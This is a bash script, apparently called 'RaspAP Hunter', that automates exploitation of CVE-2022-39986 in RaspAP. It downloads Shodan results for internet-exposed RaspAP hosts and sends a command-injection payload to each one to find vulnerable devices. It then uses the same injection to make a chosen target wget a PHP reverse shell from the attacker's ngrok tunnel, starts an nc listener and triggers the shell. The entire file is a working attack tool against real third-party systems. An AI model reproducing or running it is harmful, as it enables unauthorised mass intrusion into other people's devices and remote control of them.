#!/bin/bash


banner(){
    echo '
    ____                       ___     ____ 
   / __ \ ____ _ _____ ____   /   |   / __ \
  / /_/ // __ `// ___// __ \ / /| |  / /_/ /
 / _, _// /_/ /(__  )/ /_/ // ___ | / ____/ 
/_/ |_| \__,_//____// .___//_/  |_|/_/      
    __  __         /_/   __                    author: mind2hex
   / / / /__  __ ____   / /_ ___   _____    
  / /_/ // / / // __ \ / __// _ \ / ___/    
 / __  // /_/ // / / // /_ /  __// /        
/_/ /_/ \__,_//_/ /_/ \__/ \___//_/         
                                                         c=====e
   ____________                                         _,,_H__
  (__((__((___()    CVE-2022-39986                     //|     |
 (__((__((___()()_____________________________________// |ACME |
(__((__((___()()()------------------------------------/  |_____|
    '
}


# check_requirements checks that the necessary 
# programs are installed and the necessary 
# files exist in the current working directory
check_requirements(){
    # checking necessary programs
    echo -e "\n[!] CHECKING REQUIREMENTS..."
    for program in $( echo -e "shodan\njq\npython\nngrok\nterminator" );do 
        which $program &>/dev/null
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m ${program} \e[0m\t IS NOT INSTALLED"

            echo -e "\n- TO INSTALL PYTHON  EXECUTE: sudo apt install python3"

            echo -e "\n- TO INSTALL SHODAN  EXECUTE: sudo apt install python3-shodan"

            echo      "  SHODAN SHOULD BE CONFIGURED WITH API KEY"

            echo -e "\n- TO INSTALL NGROK   VISIT: https://ngrok.com/download"
            echo -e   "  NGROK SHOULD BE INSIDE EXECUTBLE PATH \$PATH"

            echo -e "\n- TO INSTALL TERMINATOR EXECUTE: sudo apt install terminator"
            exit
        else
            printf "%-20s \e[32m%s\e[0m\n" "${program}" "INSTALLED"
        fi
    done

    # checking ngrok configuration 
    NGROK_CONFIGURATION_FILE=~/.config/ngrok/ngrok.yml
    if [[ -e  ${NGROK_CONFIGURATION_FILE} ]];then
        if [[ -n $( cat ~/.config/ngrok/ngrok.yml | grep -E -o "authtoken.*" | cut -d ' ' -f 2 ) ]];then
            echo -e "\n[!] NGROK CONFIGURED PROPERLY..."
        else
            echo -e "\n[X] NGROK AUTHTOKEN NOT FOUND IN "
            exit
        fi
    else
        echo -e "\n[X] NGROK CONFIGURATION FILE ${NGROK_CONFIGURATION_FILE} NOT FOUND"
        exit
    fi
    
    # checking shodan configuration
    shodan info &>/dev/null
    if [[ $? -ne 0 ]];then
        echo -e "\n[X] SHODAN IS NOT CONFIGURED PROPERLY, TRY EXECUTING:"
        echo -e "\t shodan init <api key>"
        exit
    fi

    if [[ $(shodan info | head -n1 | grep -E -o "[0-9]*") -ne 0 ]];then 
        echo -e "\n[!] SHODAN CONFIGURED PROPERLY"
    else 
        echo -e "\n[X] SHODAN SCAN NOT AVAILABLE DUE TO 0 CREDITS SCAN"
        echo "[X] TRY USING ANOTHER SHODAN API KEY WITH SCAN CREDITS AND EXECUTE:"
        echo -e "\t shodan init <api key>"
        exit
    fi

    # check if php-reverse-shell.php is in the current working directory
    echo -e "\n[!] CHECKING PHP REVERSE SHELL"
    if [[ -e "./php-reverse-shell.php" ]];then
        echo -e "[!] \e[32m php-reverse-shell.php \e[0m\t EXIST IN THE CURRENT DIRECTORY"
    else
        echo -e "[X] \e[31m php-reverse-shell.php \e[0m\t DOESN'T EXIST IN THE CURRENT DIRECTORY"
        echo "[!] EXECUTING wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php --quiet"
        wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php --quiet
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m error trying to download php-reverse-shell.php from github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php \e[0m"
            exit
        fi
    fi
}


# download_shodan_results download and parse all possible targets
# IP addresses with RaspAP from shodan and saving it in IP_ADDRESSES array
download_shodan_results(){
    # downloading search results for raspap
    IP_ADDRESSES_FILENAME="shodan_scan_result"
    if [[ ! ( -e "${IP_ADDRESSES_FILENAME}.json.gz" ) ]];then
    echo -e "\n[!] DOWNLOADING SEARCH RESULT..."
    shodan download shodan_scan_result raspap
    else
    echo "[!] SEARCH RESULT ALREADY DOWNLOADED..."
    fi

    # extracting ip addresses
    echo -e "\n[!] EXTRACTING ALL POSSIBLE TARGETS IP ADDRESSES"
    gzip -d ${IP_ADDRESSES_FILENAME}.json.gz
    IP_ADDRESSES=$( jq '.ip_str' ${IP_ADDRESSES_FILENAME}.json | sed 's/"//g' )
}


# scan_raspap_targets test all ip addresses from IP_ADDRESSES for CVE-2022-39986
# using a PoC very simple, if PoC works the page will return "PWN4BLE", this means its vulnerable
scan_raspap_targets(){
    # setting up a trap in case of user keyboard interrupt or CTRL + C (SIGINT)
    # this will stop scanning without finishing program 
    trap handle_sigint SIGINT

    VULNERABLE_IP_ARRAY=()
    exit_loop=false
    echo "-------------------------------------------------"
    echo "PRESS CTRL + C TO STOP VULNERABILITY IP DISCOVERY"
    echo "-------------------------------------------------"
    for IP in ${IP_ADDRESSES[@]};do
        # ejecutar bucle hasta SIGINT
        if [[ "${exit_loop}" == true ]];then
            break
        fi

        printf "[!] Trying: %-20s --> " "${IP}"
        REQUEST_RESULT=$( curl -s -X POST -d 'cfg_id=;echo+PWN4BL3;#' "http://${IP}/ajax/openvpn/del_ovpncfg.php" --max-time 3 ) # change max time if needed

        if [[ -z $(echo $REQUEST_RESULT | grep -o "PWN4BL3" ) ]];then
            echo "NOTHING"
            continue
        else
            VULNERABLE_IP_ARRAY+=("${IP}")
            echo -e "\e[31mVULNERABLE\e[0m"
        fi
    done  

    trap - SIGINT
}

handle_sigint(){
    exit_loop=true
}


# spawn_shell_on_target show all vulnerables ip from VULNERABLE_IP_ARRAY to user 
# so user can select on which IP address to spawn a shell using ngrok and php-reverse-shell.php file
spawn_shell_on_target(){
    echo ""
    echo "-------------------------------------------------"
    echo "SELECT AN IP ADDRESS TO START A REVERSE SHELL    "
    echo "-------------------------------------------------"
    counter=0
    for IP in ${VULNERABLE_IP_ARRAY[@]};do
        printf "[%3d] %s\n" "${counter}" "${IP}"
        counter=$( expr ${counter} + 1 )
    done
    echo -n "SELECT IP >> "
    read TARGET_IP

    CURRENT_TARGET=${VULNERABLE_IP_ARRAY[${TARGET_IP}]}

    LISTENING_PORT=6965

    echo -e "\n[!] STARTING WEB SERVER TO DOWNLOAD php-reverse-shell.php ON TARGET MACHINE"
    python -m http.server ${LISTENING_PORT}  &
    progress_bar 5

    echo -e "\n[!] STARTING NGROK"
    terminator -e "ngrok tcp ${LISTENING_PORT}"
    progress_bar 5

    ADDR=$( curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | cut -d "/" -f 3 | cut -d ":" -f 1 | nslookup | grep "Address" | tail -n 1 | cut -d " " -f 2 )
    PORT=$( curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | cut -d "/" -f 3 | cut -d ":" -f 2 )
    echo -e "\n[!] NGROK ADDRESS: ${ADDR}:${PORT}"

    echo -e "\n[!] REPLACING IP AND PORT VARIABLES FROM PHP-REVERSE-SHELL"
    sed -i "s/\$ip = '.*';/\$ip = '${ADDR}';/" php-reverse-shell.php             # changing IP address
    sed -i "s/\$port = [0-9]*/\$port = ${PORT}/" php-reverse-shell.php           # changing PORT

    echo -e "\n[!] REMOVING PREVIOUS REVERSE SHELLS "
    curl -s -X POST -d "cfg_id=;rm+php-reverse-shell.php*;#" "http://${CURRENT_TARGET}/ajax/openvpn/del_ovpncfg.php"
    curl -s -X POST -d "cfg_id=;ls;#" "http://${CURRENT_TARGET}/ajax/openvpn/del_ovpncfg.php"

    echo -e "\n\n[!] DOWNLOADING REVERSE SHELL FROM http://${ADDR}:${PORT}/php-reverse-shell.php to ${CURRENT_TARGET} "
    curl -X POST -d "cfg_id=;wget+http://${ADDR}:${PORT}/php-reverse-shell.php;#" "http://${CURRENT_TARGET}/ajax/openvpn/del_ovpncfg.php"
    curl -s -X POST -d "cfg_id=;ls;#" "http://${CURRENT_TARGET}/ajax/openvpn/del_ovpncfg.php"
    sleep 5

    echo -e "\n\n[!] STOPPING WEB SERVER"
    for job in $(jobs -p);do
        kill $job
    done

    echo -e "\n[!] STARTING NC LISTENER ON localhost:${LISTENING_PORT}"
    terminator -T "PWN4BLE" -e "nc -lvnp ${LISTENING_PORT}"
    progress_bar 2

    curl http://${CURRENT_TARGET}/ajax/openvpn/php-reverse-shell.php 
    
}

progress_bar() {
    local duration=$1
    local elapsed=0

    sleep 0.5    
    # Función para dibujar la barra de progreso
    draw_progress_bar() {
        local percent=$((100 * elapsed / duration))
        local completed=$((50 * elapsed / duration))
        printf "\r["
        for i in $(seq 1 $completed); do
        printf "#"
        done
        for i in $(seq $((completed + 1)) 50); do
        printf " "
        done
        printf "] %d%%" $percent
    }

    # Bucle principal para mostrar la barra de progreso
    while [ $elapsed -le $duration ]; do
        draw_progress_bar
        sleep 1
        ((elapsed++))
    done

    # Añadir una nueva línea al final para separar la salida posterior
    echo
}


main(){
    banner
    check_requirements
    download_shodan_results
    scan_raspap_targets
    spawn_shell_on_target    
}

main